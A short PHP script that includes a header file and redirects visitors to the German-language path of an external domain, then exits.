<?php require_once 'head.php';?>
<?php
// Redirect to a different page
header("Location: https://ksoiek.intesal.net/de/");
exit();
?>
